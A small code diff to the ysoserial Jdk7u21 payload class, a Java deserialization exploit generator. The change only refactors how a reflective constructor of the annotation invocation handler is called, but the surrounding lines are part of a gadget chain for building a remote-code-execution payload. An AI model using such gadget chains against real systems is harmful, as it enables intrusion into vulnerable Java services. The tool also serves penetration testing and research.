@@ -1,5 +1,6 @@
 package ysoserial.payloads;
 
+import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
@@ -67,7 +68,8 @@ public class Jdk7u21 implements ObjectPayload<Object> {
 		HashMap map = new HashMap();
 		map.put(zeroHashCodeStr, "foo");
 
-		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+        Constructor<?> firstCtor = Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS);
+        InvocationHandler tempHandler = (InvocationHandler) firstCtor.newInstance(Override.class, map);
 		Reflections.setFieldValue(tempHandler, "type", Templates.class);
 		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
 
